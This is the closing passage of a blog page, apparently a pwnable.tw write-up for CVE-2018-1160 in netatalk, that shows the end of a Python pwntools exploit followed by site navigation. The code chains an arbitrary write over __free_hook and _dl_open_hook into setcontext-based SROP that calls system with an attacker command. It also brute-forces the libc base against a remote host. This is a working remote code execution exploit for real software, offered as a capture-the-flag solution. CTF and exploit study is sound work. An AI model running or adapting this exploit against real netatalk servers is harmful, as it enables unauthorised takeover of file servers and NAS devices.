         # put the value of _dl_open_hook into rax, then call the [rax]. That means call **_dl_open_hook
         mov     rax, cs:_dl_open_hook
         call    qword ptr [rax]
    '''</span>
    <span class="n">libc_dlopen_mode_56</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x166488</span>
    <span class="s">'''
         # control rdi to do SROP
         mov     rdi, rax
         call    qword ptr [rax+20h]
    '''</span>
    <span class="n">fgetpos64_207</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x7EA1F</span>

    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">replaceCommandPtr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>        <span class="c1"># 0x10: 1 byte func idx, 0xF bytes padding
</span>    <span class="c1"># print('commands ptr has been changed....')
</span>
    <span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
    <span class="n">sigframe</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">system_addr</span>
    <span class="n">sigframe</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">free_hook</span> <span class="o">+</span> <span class="mi">8</span>                   <span class="c1"># cmd
</span>    <span class="n">sigframe</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">free_hook</span>                       <span class="c1"># must be a writable address, as the stack of system func
</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xF</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>              <span class="c1"># padding
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_dlopen_mode_56</span><span class="p">)</span>            <span class="c1"># __free_hook, after this rop, rax = *dl_open_hook = dl_open_hook + 8
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x2bb8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>          <span class="c1"># __free_hook + 8
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">dl_open_hook</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>               <span class="c1"># dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fgetpos64_207</span><span class="p">)</span>                <span class="c1"># _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x18</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">setcontext_53</span><span class="p">)</span>             <span class="c1"># dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)[</span><span class="mh">0x28</span><span class="p">:]</span>           <span class="c1"># now rdi = dl_open_hook + 8, thus we cut the offset from rdi to this pos
</span>
    <span class="n">aaw</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1"># print('aaw completed, trigger free()...')
</span>    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>                  <span class="c1"># trigger free()
</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">leak_addr</span> <span class="o">=</span> <span class="n">bruteforce</span><span class="p">()</span>
    <span class="c1"># leak_addr = 0x7fa9bcc90000   # target
</span>    <span class="k">print</span><span class="p">(</span><span class="s">'leaked an address: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xffff000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">):</span>
        <span class="n">do_exploit</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">CMD</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pwnable-tw/" class="post-tag no-text-decoration" >pwnable.tw</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=pwnable.tw CVE-2018-1160 - gtrboy's blog&url=https://gtrboy.github.io/posts/netatalk/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=pwnable.tw CVE-2018-1160 - gtrboy's blog&u=https://gtrboy.github.io/posts/netatalk/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=pwnable.tw CVE-2018-1160 - gtrboy's blog&url=https://gtrboy.github.io/posts/netatalk/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/bus/">物联网设备消息总线机制的使用及安全问题</a><li><a href="/posts/malloc/">malloc源码学习（glibc-2.23）</a><li><a href="/posts/L_star/">L* 算法学习</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/l-%E7%AE%97%E6%B3%95/">L*算法</a> <a class="post-tag" href="/tags/malloc%E6%BA%90%E7%A0%81/">malloc源码</a> <a class="post-tag" href="/tags/pwnable-tw/">pwnable.tw</a> <a class="post-tag" href="/tags/%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/">消息总线</a> <a class="post-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CVE-2022-23121/"><div class="card-body"> <span class="timeago small" > May 1 <i class="unloaded">2022-05-01T11:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）</h3><div class="text-muted small"><p> 本文翻译自NCC Group的博客，介绍了该团队在Pwn2Own比赛时针对西部数据PR4100 NAS的远程代码执行漏洞利用的细节。 概述 这篇博客文章介绍了2021年9月由NCC Group的Exploit Development Group（EDG）小组中的Alex Plaskett，Cedric Halbronn以及Aaron Adams三人发现并利用的一个返回值未检测漏洞。...</p></div></div></a></div><div class="card"> <a href="/posts/L_star/"><div class="card-body"> <span class="timeago small" > Jul 27, 2021 <i class="unloaded">2021-07-27T17:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>L* 算法学习</h3><div class="text-muted small"><p> 本篇旨在记录自己学习L*算法的过程和理解。 参考： 吴礼发老师的《网络协议逆向分析及应用》 L*算法创世文：Learning Regular Sets from Queries and Counterexamples* 基于米利机的LM*算法：Reverse Engineering Enhanced State Models of Black Box So...</p></div></div></a></div><div class="card"> <a href="/posts/malloc/"><div class="card-body"> <span class="timeago small" > Jul 25, 2021 <i class="unloaded">2021-07-25T17:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>malloc源码学习（glibc-2.23）</h3><div class="text-muted small"><p> 学习glibc-2.23源码中malloc相关知识，文章顺序和malloc流程相同。本文仅为自己缕清思路用，因此很多细节和基础没有涉及，可能会比较乱。若你看到了这篇文章，推荐看下面的博客，介绍得可能会更加细致。 参考： Linux内存分配小结–malloc、brk、mmap 董哥的黑板报 - 堆漏洞挖掘 堆漏洞挖掘中的bins分类(fastbin、u...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/L_star/" class="btn btn-outline-primary" prompt="Older"><p>L* 算法学习</p></a> <a href="/posts/CVE-2022-23121/" class="btn btn-outline-primary" prompt="Newer"><p>【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="">gtrboy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/l-%E7%AE%97%E6%B3%95/">L*算法</a> <a class="post-tag" href="/tags/malloc%E6%BA%90%E7%A0%81/">malloc源码</a> <a class="post-tag" href="/tags/pwnable-tw/">pwnable.tw</a> <a class="post-tag" href="/tags/%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/">消息总线</a> <a class="post-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://gtrboy.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
